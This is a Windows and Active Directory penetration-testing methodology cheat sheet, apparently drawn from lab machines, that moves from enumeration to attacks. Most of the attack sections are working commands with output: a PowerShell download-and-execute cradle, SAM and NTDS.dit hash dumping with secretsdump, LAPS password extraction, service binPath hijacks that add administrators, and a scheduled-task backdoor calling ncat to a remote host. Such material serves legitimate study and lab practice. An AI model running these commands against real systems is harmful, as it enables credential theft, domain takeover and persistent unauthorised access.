# Windows & Active Directory - Enumeration & Exploitation Methodology
### Active Directory Definitions
**`Active Directory`** - Microsoft implementation used for centalised system management. It performs: user authentication, locating computers by names, applies policies to users and computers, discovers abd locate services (MSSQL, DNS) and stores configuration data.  

**`Domain Controller`** -  is a server that runs Active Directory and its services, and provides authentication for the domain.

### Windows Definitions

**Execution Policy** — a security control that limits which PowerShell scripts can run. Scopes: `MachinePolicy`, `UserPolicy`, `Process`, `CurrentUser`, `LocalMachine`.

|Policy|Description|
|---|---|
|`AllSigned`|All scripts (remote and local) must be signed by a publisher. Warns on unknown publishers.|
|`Bypass`|Nothing blocked, no warnings.|
|`Default`|`Restricted` on workstations, `RemoteSigned` on servers.|
|`RemoteSigned`|Downloaded scripts need a signature; locally written scripts don't.|
|`Restricted`|Only individual commands allowed; scripts blocked.|
|`Undefined`|No policy set for this scope. If all scopes are `Undefined`, `Restricted` applies.|
|`Unrestricted`|Default on non-Windows; allows unsigned scripts but warns.|

**Built-in Windows service accounts:**
- **LocalService** — minimum privileges (weaker than a normal user account); used by services that don't need internet access or credentials (appears anonymous on the LAN).
- **NetworkService** — restricted local privileges, but has network access; identified on the LAN as `DOMAIN\MACHINENAME$`.
- **LocalSystem** — the **highest** privilege level that exists on the local OS. Most services run under this by default (least-privilege principle says they shouldn't, but often do).

**Payload file types** (for delivery/execution once you have some level of access):

| Type       | Description                                                                                                                                                            |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `.dll`     | Dynamic Linking Library — shared code/data used by multiple programs. Injecting a malicious DLL or hijacking a vulnerable one can elevate to SYSTEM and/or bypass UAC. |
| `.bat`     | Text-based DOS batch scripts for automating command-line tasks — e.g. open a port or call back to an attacker box.                                                     |
| `.vbs`     | VBScript — lightweight, dated scripting language; mostly relevant to phishing (e.g. malicious macros/cells triggering script execution).                               |
| `.msi`     | Windows Installer database format; craft a payload as `.msi` and run via `msiexec` for an elevated reverse shell.                                                      |
| PowerShell | Microsoft's modern shell + scripting language (built on .NET CLR). Most flexible option for gaining a shell/execution on a host.                                       |

---
# Enumeration

`ping <ip>` and compare TTL against a [TTL reference table](https://subinsb.com/default-device-ttl-values/) for a quick OS guess.

```bash                                     
sudo nmap -sV -sC --script=banner --reason -p- <ip>       # full port scan + versions
sudo nmap --script=discovery -p <port(s)>/-p- -O <ip>     # discovery scan — very noisy, very thorough
```
1. Determine OS
2. Determine Hostname
3. Determine FQDN / Domain Controller 


**Per-service follow-up (once ports are known):**
1. Enumerate each service individually for version-specific vulnerabilities:
    - Metasploit modules by version
    - ExploitDB / `searchsploit` by version
    - Nmap script output (e.g. anonymous login flags)
    - Google: `"<service> <version> exploit github"`
    - **Document every discovered vulnerability.**
2. File share protocols worth checking: FTP, SMB (§1.3), NFS (`showmount -e <ip>`).
3. Management protocols worth checking: IPMI, SNMP (`onesixtyone` → `snmpwalk`, UDP), Oracle TNS.
4. Cross-check both Metasploit and ExploitDB for CVEs matching the discovered OS build — compare against [Microsoft's CVE list](https://www.cvedetails.com/vendor/26/Microsoft.html).


**`Lightweight Directory Access Protocol (LDAP)`** — a protocol that provides access to Active Directory's centralized database, allowing queries and modifications against objects such as: usernames, groups, distinguished names (DNs), computers, organizational units (OUs), permissions, group policies, and their attributes.

**`Offensive Vector:`** Since LDAP is often queryable, we can attempt an anonymous bind - authenticating without any credentials (empty username and password fields) - to see if the directory permits unauthenticated access. If successful we can expose priceless information, about Active Directory Structure, which could be exfiltrated and use it for the further attacks. **SERVICE IS THE PRIMARY TARGET OF ENUMERATION!**

```bash
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
```
######  user query  /  query all objects
```bash
nxc ldap <ip>/<FQDN> --users / --users-export <file>
nxc ldap BABYDC.baby.vl -u '' -p '' --query "(sAMAccountName=*)" ""
nxc ldap BABYDC.baby.vl -u '' -p '' --query "(objectClass=*)" "" | grep "Response for object:"
```
######  DNs grepping

**`Distinguished names (DNs)`** - unique identifier of an objects and its exact location within LDAP and Active Directory and includes next components:

| Prefix | Meaning                                                                                                                                       | Example               |
| ------ | --------------------------------------------------------------------------------------------------------------------------------------------- | --------------------- |
| `CN`   | Common Name                                                                                                                                   | `CN=Administrator`    |
| `OU`   | Organizational Unit (folder-like container)                                                                                                   | `OU=IT`, `OU=Servers` |
| `DC`   | **Domain Component** (a single label of the domain name, split at each dot — _not_ "Domain Controller"; unrelated meaning, same abbreviation) | `dc=baby,dc=vl`       |
| `CN`   | Can also represent groups, computers, policies                                                                                                | `CN=Domain Admins`    |
| `CN`   | Can also represent objects like groups, computers, policies                                                                                   | `CN=Domain Admins`    |

**`ldapsearch`** - tool used for query LDAP (could be easily replaced with NXC)
```bash
ldapsearch -x   # use simple authentication
	-b          # Base DN specification (tree starting point)
	"*"         # shorthand of (objectClass=*) (means match every object)
	-H ldap://  # connect to..
```
```bash
ldapsearch -x -b "dc=...,dc=..." "*" -H ldap://BabyDC.baby.vl | awk -F ': ' '/^dn:/{print $2}' | cut -d "=" -f2  | tail -11 | cut -d "," -f1 | tr " " "."
```

###### File Share Enumeration
**`SMB`** - take a look on the file share using `guest credentials`
```bash
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-31T15:24:46
|_  start_date: N/A
```

```bash
smbclient -NL <ip>                    # list shares
smbclient //<ip>/<share> -U guest%    # use guest credentials
```
###### Server Enumeration
Also it is worth to check **`remote procedure call`** records
```bash
rpcclient -U "%" <target>   # using anonymous access
```
``` bash
srvinfo                      # server information
enumdomains                  # enumerate ALL domains deployed in the network
enumdomusers                 # enumerate all users
querydominfo                 # server, user, domain info deployed on the target
queryuser <RID>              # displays all information about selected user
querygroup                   # all info about selected group
netsharegetinfo <share>      # info about specific share
```

---

# Footprint
1. **INVESTIGATE!** Look at the obtained before files.
		What they are representing? Why you can exfiltrate from them?
		Can you access / use them? Find out their purpose. Look for the Details
2. **LAST OPTION!** Based on the users: try to bruteforce every single user / try password spraying (using `nxc`)

###### Authentication Methods
```bash
evil-winrm-py -u <user> -p <password> -i <target>
evil-winrm-py -u <user> -H <hash> -i <target>
evil-winrm-py -u <user> --cert-pem <certificate.crt> --priv-key-pem <private.key> -i <target>
```
---

# Alternative Method: Vulnerability Exploitation
#### Vulnerability identification (OS case)
1. Compare the discovered OS build against [Microsoft's CVE list](https://www.cvedetails.com/vendor/26/Microsoft.html).
2. Check Metasploit and ExploitDB for matching CVEs.
#### Building the payload
- **Metasploit (`msfvenom`)** — encode output with **DarkArmour** for AV evasion.
- **Mythic C2 framework** — more complex, alternate option.
- Payload extension choices: see the Windows definitions table in §0.2 (DLL / Batch / VBS / MSI / PowerShell).
#### Transfer & execution (goal: shell)
- **Impacket** — Python toolset for direct protocol interaction. Key tools: `psexec.py` (uploads a service binary via SMB, registers it with the Service Control Manager over RPC, creates a named pipe → semi-interactive shell), `smbclient.py`, `wmiexec.py`, Kerberos tooling, standalone SMB server.
- **SMB (with valid creds)** — access `C$`/`ADMIN$`: `smbclient //target/C$ -U user`, then `put` your payload.
- **Metasploit modules** — many auto-build/stage/execute payloads for you.
- **Other protocols** — FTP, TFTP, HTTP/S, etc.; check what's open for uploading. [Payloads All The Things — Windows Download & Execute](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md) has quick one-liners.

---

# Windows Local Enumeration Methodology

users/system → processes/tasks/network → permissions/policy (the things that actually gate escalation) → automated tooling as a final cross-check, not a starting point.

**Step 0 — Current user context**
```powershell
whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name               State          Description
SeRestorePrivilege           Enabled        Restore files and directories
SeDebugPrivilege             Enabled        Debug programs
SeChangeNotifyPrivilege      Enabled        Bypass traverse checking
SeImpersonatePrivilege       Enabled        Impersonate a client after authentication
SeCreateGlobalPrivilege      Enabled        Create global objects
SeIncreaseWorkingSetPrivilege Disabled      Increase a process working set
```

- `SeChangeNotifyPrivilege` — bypasses directory traversal checks (rarely directly useful).
- `SeImpersonatePrivilege` — allows impersonating others post-authentication; important for priv-esc (e.g. Potato-family exploits).

```powershell
whoami /groups
GROUP INFORMATION
-----------------
Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                                            Well-known group S-1-5-3       
```
**Step 1 — User & group enumeration (broaden outward)**
```powershell
net user <username>
Get-LocalUser -Name "username" | fl
Get-LocalGroup -Name "groupname" | fl
Get-CimInstance Win32_UserAccount -Filter "Name='John'" | Format-List *
```

**Step 2 — OS / system enumeration**
`compmgmt.msc` — GUI entry point for local users/groups, services, disks, event viewer.
```powershell
Get-ComputerInfo                                             # all possible info
Get-ComputerInfo -Property "OsName", "OsVersion", "OsArchitecture"
systeminfo                                                    # OS version, network, hardware, updates
wmic qfe                                                      # installed updates
```

Modern (`Get-CimInstance`) vs legacy (`Get-WmiObject`, PowerShell 3.0):
```powershell
Get-CimInstance -ClassName Win32_OperatingSystem   # system info
Get-CimInstance -ClassName Win32_Process           # running processes
Get-CimInstance -ClassName Win32_Service           # services
Get-CimInstance -ClassName Win32_BIOS              # BIOS info
```

**Step 3 — Process & task listing**
```powershell
# CMD
tasklist
tasklist /v
tasklist /svc          # process + PID + service

# PowerShell
Get-Process > file.txt
```

**Step 4 — Scheduled tasks**
```powershell
schtasks /query /fo LIST /v
```
```
TaskName: \\CorpBackupAgent
Next Run Time: 2/24/2025 3:38:46 PM
Task To Run: powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\ProgramData\CorpBackup\Scripts\backupprep.ps1
Run As User: Administrator
Repeat: Every: 0 Hour(s), 2 Minute(s)
```

**Flag for follow-up:** this task runs as `Administrator` and executes a script from a `ProgramData` path on a schedule — exactly the kind of entry worth checking permissions on next.

**Step 5 — Network enumeration (listening ports)**

```powershell
netstat -ano
```
```
Proto  Local Address          Foreign Address        State           PID
TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       408
TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
TCP    0.0.0.0:5986           0.0.0.0:0              LISTENING       4
TCP    10.129.19.109:3389     10.10.14.79:32874      ESTABLISHED     408
```

**Step 6 — File & path permissions**
```powershell
icacls "C:\ProgramData\CorpBackup\Scripts\backupprep.ps1"
```
```
Everyone:(I)(F)
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(RX)
```

**Tie-back to Step 4:** this is the same script the `CorpBackupAgent` scheduled task runs as `Administrator`. If `Everyone` had `(F)` (full control) instead of just `BUILTIN\Users:(I)(RX)`, that's a textbook scheduled-task-hijack path — worth practicing spotting read/execute vs. full control on privileged-run scripts.

**Step 7 — Automated enumeration (verification pass, not a starting point)**
```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.79:8090/winPEASS.ps1')" > winpeas.txt
```

Run this **after** manual enumeration — good for catching what you missed, but relying on it first skips the reasoning practice (useful for CJCA/GCIH/CPTS-style methodology building).

**Suggested flow recap:** `whoami /priv` + `/groups` → user/group enum → system/OS enum → processes/tasks → scheduled tasks → network → execution policy → file permissions → WinPEAS as a final sweep.

**Step 8 — Final Enumeration**
Via `services.msc`, identify for each service:

1. Service name
2. Full path to the executable — **weak NTFS permissions on the destination directory let an attacker modify/replace the binary** 
3. Startup type / account it runs as most run as `LocalSystem` 


---
# Privilege Escalation Methods
1. Make sure that you enumerated the entire system
---
### Privilege Escalation Vector - SeBackupPrivilege 
###### (Dumping SAM)
Interesting and useful links:
https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/tree/master
https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/tree/master/Notes

**`SeBackupPrivilege`** - privilege, which allows user to read files and directories, in addition to creating backups, **regardless** their security policies. **NORMALLY NOT GRANTED FOR THE USERS!**  

Technique: 
	1. Copy and Download `SAM` hive of `HKLM` to the directory with the writing permissions
	2. Copy and Download `SYSTEM` hive of `HKLM` to the directory with the writing permissions
	3. Using `impacket-secretdump` dump all hashed inside.

**`Security Account Manager (SAM)`** hive - a part of the Windows registry, which **stores all information about *local accounts*** - usernames, security identifiers (SIDs), group memberships, and password hashes (NTLM hashes, stored as LM/NT hash pairs depending on configuration)

**`SYSTEM`** hive - basically stores the hardware and system configuration data. **Critically**: stores **boot key** (`sys key`), which is used to **encrypt and decrypt password hashes** stored in the **`SAM`**. 

**`SeRestorePrivilege`** - bypasses **write** security controls to modify, overwrite, or **replace any files or system object**

```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> reg save hklm\sam sam.hive
The operation completed successfully.    # saving sam.hive
```
```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> reg save hklm\system system.hive
The operation completed successfully.    # saving system.hive
```

```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> download sam.hive ~/
Downloading C:\Users\Caroline.Robinson\Documents\sam.hive: 64.0kB [00:00, 285MB/s]                                                    
[+] File downloaded successfully and saved as: /home/lilith/sam.hive

evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> download system.hive ~/
Downloading C:\Users\Caroline.Robinson\Documents\system.hive: 19.6MB [00:23, 857kB/s]                                                 
[+] File downloaded successfully and saved as: /home/lilith/system.hive
```
##### impacket secretsdump.py 
**`secretsdump.py`** - uses boot key (sys key) for decrypt and extract passwords and usernames from the `SAM` and `LSA` (Local Security Authority). 
***Process chain:***
`Boot key` - decrypts `SAM` key, then `SAM` key decrypts each user's hash.

```bash
sudo secretsdump.py -sam sam.hive -system system.hive LOCAL                                  
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```
```bash
evil-winrm-pu -i <ip> -u <user> -H <hash> 
```

---
### Privilege Escalation Vector - SeBackupPrivilege
###### (Dumping Domain Hashes)

If SAM hashes didn't give us any necessary credentials, we can try to dump the entire Active Directory's database, which contains information about its objects.

**`NTDS.dit`** - file, which contains domain hashes, and can be decrypt using `SYSTEM boot key` mentioned above. However, this file is locked and we are unable to copy it. For this purpose we will create a snapshot (shadow copy) of the drive using `diskshadow` (windows implementation for creating snapshots) with the script seen below. 

**IMPORTANT!** We are able to doing this only due to our current privileges `SeRestorePrivilege` (bypasses write security policies) `SeBackupPrivilege` (allows us create the backups).

`robocopy` with the `/b` switch is able copy domain hashed database - `ntds.dit` from `E:\Windows\NTDS`
	 `/b` switch enables **backup mode**, which bypass file and folder permission settings (Access Control Lists (ACLs)).  

```bash
 cat backup                                                         
set verbose on                              # detailed output
set metadata C:\Windows\Temp\test.cab       # save all metadata (initial properties)
set context persistent                      # persistent mean - copy will survive a reboot;                                                it won't be automaticaly clean up
add volume C: alias cdrive                  # createas and alias for C:
create
expose %cdrive% E:                          # takes the shadowcopy of the cdrive (C's allias)



unix2dos backup                             # converts unix format to the windows suitable
```

Transmitting file using local web-server:
```bash 
python3 -m http.server 9001  
```
```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> wget http://10.10.15.39:9001/backup -OutFile backup -UseBasicParsing # -UseBasicParsing for skipping HTML/DOM fetching by the  Internet Exproler 
```
Transmitting using `evil-winrm`:
```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> upload /home/lilith/backup .
Uploading /home/lilith/backup.txt: 100%
[+] File uploaded successfully as: C:\Users\Caroline.Robinson\Documents\backup.txt
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> ls


    Directory: C:\Users\Caroline.Robinson\Documents


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                                                                               
-a----         7/28/2026   7:27 AM            129 backup                                                                                                                              
-a----         7/28/2026   7:17 AM          49152 sam.hive                                                              
-a----         7/28/2026   7:17 AM       20480000 system.hive                                                           
```
Now we just ran `diskshadow` /s for creating frozen-zone (snapshot) and specifying script (shadow copy parameters) 
```bash

evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> diskshadow /s ./backup
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  7/28/2026 7:40:01 AM

-> set verbose on                             
-> set metadata C:\Windows\Temp\test.cab
-> set context persistent
-> add volume C: alias cdrive
-> create
Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.

* Including writer "Task Scheduler Writer":
	+ Adding component: \TasksStore

* Including writer "VSS Metadata Store Writer":
	+ Adding component: \WriterMetadataStore

...
The shadow copy was successfully exposed as E:\.
-> 
```
Using `robocopy /b` we just copy this file to the current location
```bash
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> robocopy /b E:\Windows\NTDS . ntds.dit
```

Then, after successful copying we just download it to our localmachine 
```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> download ntds.dit .
Downloading C:\Users\Caroline.Robinson\Documents\ntds.dit: 100%
[+] File downloaded successfully and saved as: /home/lilith/ntds.dit
```
Same stuff, same actions - **BUT!** Now we are working with the priceless target - domain hashes.
```bash
secretsdump.py -ntds ntds.dit -system system.hive LOCAL                               
Impacket v0.14.0.dev0+20260611.171053.546f7acc - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
...
```

`Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::`, where `ee4457ae59f1e3fbd764e33d9cef123d` is the Administator's hash!

---

### Privilege Escalation Vector - LAPS (Local Administrator Password Solution)

**`Local Administrator (OS Architecture)`** - on every machine exists its own `local administrator`. Every user which is permitted to run programs with the high privileges - so it runs the command `as the local administrator` (as root and sudo in Linux). Main idea: being compromised, local administrator account could potentially lead to: **lateral movement** (same image and credentials on the entire network), **compromise of the entire Active Directory.**    

**`Local Administrator Password Solution`** - is a solution that automatically generates a unique, complex, and random password for every machine on the network (either time-based or event-based). This effectively mitigates lateral movement and Pass-the-Hash attacks. Once generated, the password is secure and stored in a dedicated Active Directory attribute—either as **ciphertext** (Modern LAPS) or **plaintext** (Legacy LAPS).

**`Modern LAPS Control:`** The encrypted password blob cannot simply be passed or read. To decrypt and view the plaintext string, an attacker must also compromise a user account that explicitly belongs to the designated **Authorized Decryptor** group.

##### Enumeration
```poweshell
net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

...

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users         
The command completed successfully.
```
Group: `LAPS_Readers `
##### Manual Exploitation
```powershell
Get-ADComputer DC01 -property 'ms-mcs-admpwd' 
DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : }fBa}6zP;I34T-0)47fj%0C+
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName : 
```
`ms-mcs-admpwd` - attribute which stores LAPS (local administrator credentials)
##### Exploitation using Toolkit
https://github.com/leoloobeek/LAPSToolkit
```powershell
Get-LAPSComputers        # displays all computers with the enblead laps password expriation,                            and password if user has access
ComputerName       Password                 Expiration         
------------       --------                 ----------         
dc01.timelapse.htb }fBa}6zP;I34T-0)47fj%0C+ 08/05/2026 16:12:22

Find-LAPSDelegatedGroups  # parses all OUs to find to who LAPS read it permitted
OrgUnit                                    Delegated Groups      
-------                                    ----------------      
OU=Domain Controllers,DC=timelapse,DC=htb  TIMELAPSE\LAPS_Readers
OU=Servers,DC=timelapse,DC=htb             TIMELAPSE\LAPS_Readers
OU=Database,OU=Servers,DC=timelapse,DC=htb TIMELAPSE\LAPS_Readers
OU=Web,OU=Servers,DC=timelapse,DC=htb      TIMELAPSE\LAPS_Readers
OU=Dev,OU=Servers,DC=timelapse,DC=htb      TIMELAPSE\LAPS_Readers

Find-AdmPwdExtendedRights  # Parses each AD computer with LAPS read permissions
ComputerName       Identity               Reason   
------------       --------               ------   
dc01.timelapse.htb TIMELAPSE\LAPS_Readers Delegated
```
##### Exploitation using NetExec
```bash
nxc ldap 10.129.38.65 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps  
```

**`Possible Scenarios`**:
	1. If local administrator is compromised **only on the one machine**, lateral movement is possibly only for looking deep in the machine's memory attempting to find data and credentials of other users. Otherwise - it's impossible
	2. If user, which belongs to the `LAPS_Readers` global groups is compromised, attacker gains `master-key` of the entire Active Directory. Main mechanism: `LAPS_Reader` just Domain Controller for the keys of other Workstations (Toolkit or NetExec)
	`Get-ADComputer -Filter * -Properties 'ms-mcs-admpwd' | Select-Object Name, ms-mcs-admpwd` -     for asking about every local administrator password as a reader


---
### Privilege Escalation Vector — Service Misconfiguration (Recovery Action Abuse)

`sevices.msc` - basic buit-in service management application, based on its information we can identify:
1. Service Name
2. Full Path to Executable File
	!!! **It can leads to privilege escalation**. If destination directory has weak NTFS permissions an attacker can simply modify or replace the file with malicious one 
3. Startup Time

![[Pasted image 20260603082152.png|697]]

![[Pasted image 20260603082154.png|689]]

**Notable built-in service accounts in Windows:**
- LocalService - minimum privileges (weaker than user account), used for services, which don't need any Internet Access and Credentials (in the LAN is anonymous)
- NetworkService — has restricted local privileges, but has network access and is identified on the LAN by the machine account name (`DOMAIN\MACHINENAME$`)
- LocalSystem - the highest existing privilege on the individual OS!

##### Running After the First Failure method
![[Pasted image 20260603084318.png]]
In the **Recovery** tab, a service can be configured to `execute another program` after the first failure. If you have `sc config` rights on a service running as `LocalSystem`, you can hijack its execution:
```powershell
sc config VulnService binPath= "cmd.exe /c net user Administrator NewPass123!"        # change a password
sc config VulnService binPath= "cmd.exe /c net localgroup administrators john /add"   # add yourself to admins
```
Restart the service to trigger it:
```powershell
sc stop VulnService
sc start VulnService
```

**Dumping hashes via the same technique:**
```bash
sc config VulnService binPath= "cmd.exe /c reg save HKLM\SAM C:\Temp\sam.hive && reg save HKLM\SYSTEM C:\Temp\system.hive"
```
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

---
##### Persistence / Backdoors
```powershell
schtasks /create /tn "Backdoor" /sc ONSTART /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
######### Changing an existing task ################
schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
```

